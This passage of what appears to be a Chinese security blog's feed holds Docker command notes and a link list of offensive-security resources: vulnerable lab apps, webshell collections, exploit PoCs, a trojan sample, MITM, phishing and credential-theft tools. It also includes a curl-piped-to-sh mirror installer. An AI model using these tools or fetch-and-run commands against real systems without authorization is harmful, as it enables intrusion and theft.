class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t IMAGE /bin/bash  # 启动交互式容器</span><br><span class="line">docker inspect NAME  # 查看详细信息？</span><br><span class="line">docker run --name=xxx -it IMAGE /bin/bash  # 以xxx为名字运行</span><br><span class="line"><span class="meta">#</span><span class="bash"> CTRL + p + q   =&gt;  退出并后台运行</span></span><br><span class="line">docker attach 容器名  # 恢复到后台容器，更建议使用 docker exec？</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看守护进程</span></span><br><span class="line">ps -ef | grep docker</span><br><span class="line">sudo status docker</span><br><span class="line"></span><br><span class="line">docker top </span><br><span class="line">docker exec [-d][-i][-t] nginx  # 为运行中的容器启动新进程</span><br><span class="line">docker logs </span><br><span class="line">docker images#列出本地镜像</span><br><span class="line">docker start CONTAINER #启动一个或多少已经被停止的容器</span><br><span class="line">docker stop / kill CONTAINER #停止一个运行中的容器</span><br><span class="line">docker restart CONTAINER #重启容器</span><br><span class="line">docker rm CONTAINER #删除容器  -f 强制删除</span><br><span class="line">docker rmi IMAGE #删除镜像</span><br><span class="line">docker rmi $(docker images -q ubuntu)  # 删除Ubuntu所有镜像</span><br><span class="line">sudo systemctl daemon-reload #reload daemon.json</span><br><span class="line">sudo systemctl restart docker #重启docker</span><br><span class="line"></span><br><span class="line">docker info  # 查看信息</span><br><span class="line">docker diff 容器名 # 查看改动信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 端口映射</span></span><br><span class="line">docker run -p 80 -it # -i 标准输入保持打开</span><br><span class="line">docker run -p 8080:80 -it # -t 为docker分配一个伪终端(pseudo-tty)，并绑定到容器的标准输入</span><br><span class="line">docker run -p 0.0.0.0:80 -it </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看端口映射情况</span></span><br><span class="line">docker port docker_name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器快照？</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 导出容器</span></span><br><span class="line">docker export ID &gt; ubuntu.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"> 导入容器</span></span><br><span class="line">cat ubuntu.zip | docker import - test/ubuntu:v1.0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过URL导入</span></span><br><span class="line">docker import http://xxx example/imagesrepo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据卷</span></span><br><span class="line">docker volume create xxx</span><br><span class="line">docker run -it -v ~/datavolume:/data:ro ubuntu /bin/bash  # ro设置只读权限</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据卷容器</span></span><br><span class="line">docker run -it --name dv --volumes-from dvt4 ubuntu /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制文件到容器中</span></span><br><span class="line">docker cp xxx id:/dir</span><br><span class="line">docker cp ./test apache:/var/www/</span><br><span class="line">docker exec -it apache</span><br></pre></td></tr></table></figure><h2 id="部署实例"><a href="#部署实例" class="headerlink" title="部署实例"></a>部署实例</h2><p><strong>Nginx 部署流程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建映射80端口的交互式容器</span></span><br><span class="line">docker run -p 8080:80 --name web -it ubuntu /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装Nginx</span></span><br><span class="line">apt update</span><br><span class="line">apt install - y nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装文本编辑器 vim</span></span><br><span class="line">apt install -y vim</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建静态页面</span></span><br><span class="line">cd /var/www/html</span><br><span class="line">touch index.html</span><br><span class="line">echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; index.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改Nginx配置文件</span></span><br><span class="line">whereis nginx  # 找到安装目录</span><br><span class="line">vim /etc/nginx/sites-enabled/default  # 修改 root 目录</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行Nginx</span></span><br><span class="line">nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证网站访问</span></span><br><span class="line">curl IP:port  # ip 可用宿主机的IP加映射端口，也可以用 docker inspect web 查看真实容器IP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 停止容器</span></span><br><span class="line">docker stop web</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">docker start -i web  # 此时会发现，nginx已经停止</span><br><span class="line">docker exec web nginx </span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果之前没有指定端口时，重新启动时 port 将发生变化</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/2ad3edf3c61f" target="_blank" rel="noopener">sqli-labs Docker</a></p><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过容器构建</span></span><br><span class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</span><br><span class="line">docker commit \</span><br><span class="line">    --author "Tao Wang &lt;twang2218@gmail.com&gt;" \</span><br><span class="line">    --message "修改了默认网页" \</span><br><span class="line">    webserver \</span><br><span class="line">    nginx:v2</span><br><span class="line"><span class="meta">#</span><span class="bash"> ！慎用 docker commit</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用dockerfile构建镜像  —— 包括一系列命令的文件，类似shell脚本？</span></span><br><span class="line">dockerfile编写语法</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注释</span></span><br><span class="line"></span><br><span class="line">docker build   # 构建镜像</span><br></pre></td></tr></table></figure><h2 id="优化体验"><a href="#优化体验" class="headerlink" title="优化体验"></a>优化体验</h2><p><strong>配置 Docker 加速器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br><span class="line">sudo systemctl restart docker.service  # 重启 Docker 生效</span><br><span class="line"></span><br><span class="line">docker info</span><br><span class="line"><span class="meta">#</span><span class="bash"> 包含以下信息，加速器配置成功</span></span><br><span class="line">Registry Mirrors:</span><br><span class="line"> http://f1361db2.m.daocloud.io/</span><br></pre></td></tr></table></figure><p><strong>Docker不使用sudo</strong></p><p>将用户添加到 docker 用户组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER  # 先试这个</span><br><span class="line"></span><br><span class="line">cat /etc/group | grep docker # 查找 docker 组，确认其是否存在</span><br><span class="line">groups # 列出自己的用户组，确认自己在不在 docker 组中</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果 docker 组不存在，则添加之：</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将当前用户添加到 docker 组</span></span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启服务</span></span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换一下用户组（刷新缓存）</span></span><br><span class="line">newgrp - docker;</span><br><span class="line">newgrp - `groups $&#123;USER&#125; | cut -d' ' -f1`; # TODO：必须逐行执行，不知道为什么，批量执行时第二条不会生效</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者，注销并重新登录</span></span><br><span class="line">pkill X</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;p&gt;一个 &lt;strong&gt;Docker Registry&lt;/strong&gt; 中可以包含多个 &lt;strong&gt;仓库（Reposit
      
    
    </summary>
    
    
      <category term="Docker" scheme="https://wywwzjj.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>漏洞练习平台及工具</title>
    <link href="https://wywwzjj.top/2018/11/23/%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0%E5%8F%8A%E5%B7%A5%E5%85%B7/"/>
    <id>https://wywwzjj.top/2018/11/23/漏洞练习平台及工具/</id>
    <published>2018-11-23T02:38:38.000Z</published>
    <updated>2019-05-16T03:47:00.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h2><p>WebGoat漏洞练习环境</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>Damn Vulnerable Web Application</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><h2 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h2><p>端口扫描器Nmap</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>漏洞路由扫描器</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><h2 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h2><p>社工插件，可查找以email、phone、username的注册的所有网站账号信息</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>webshell大合集</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p><p>XSS数据接收平台</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>Short for command injection exploiter，web向命令注入检测工具</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理，通过加载sqlmap api进行sqli实时检测</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>.git泄露利用EXP</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>一款开源WAF</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><h2 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h2><p>windows渗透神器</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h2 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h2><p>msf</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h2 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h2><p>ExploitDB官方git版本</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>Simple test for CVE-2016-2107</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权)</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h2 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h2><p>中间人攻击框架</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>可扩展的中间人代理工具</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>密码破解工具</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h2 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h2><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）</p><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h2 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h2><p>二进制EXP编写工具</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h2 id="安全资料"><a href="#安全资料" class="headerlink" title="安全资料"></a>安全资料</h2><p>域渗透教程</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><p>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="noopener">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></p><p><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="noopener">https://github.com/smartFlash/pySecurity</a></p><p>data_hacking合集</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>ctf及黑客资源合集</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>《DO NOT FUCK WITH A HACKER》</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><h2 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h2><p>近年ctf writeup大全</p><p><a href="https://github.com/ctfs/write-ups-2017" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2017</a></p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p>fbctf竞赛平台Demo</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><h2 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h2><p>大礼包（什么都有）</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project-analysis</a></p><p>python框架，库，资源大合集</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><p>python 正则表达式库（用于简化构造复杂的python正则表达式）</p><p><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></p><p>python任务管理以及命令执行库</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>py3 爬虫框架</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;练习平台&quot;&gt;&lt;a href=&quot;#练习平台&quot; class=&quot;headerlink&quot; title=&quot;练习平台&quot;&gt;&lt;/a&gt;练习平台&lt;/h2&gt;&lt;p&gt;WebGoat漏洞练习环境&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/WebGoat/WebGo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs 通关笔记</title>
    <link href="https://wywwzjj.top/2018/11/02/Sqli-labs-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>https://wywwzjj.top/2018/11/02/Sqli-labs-通关记录/</id>
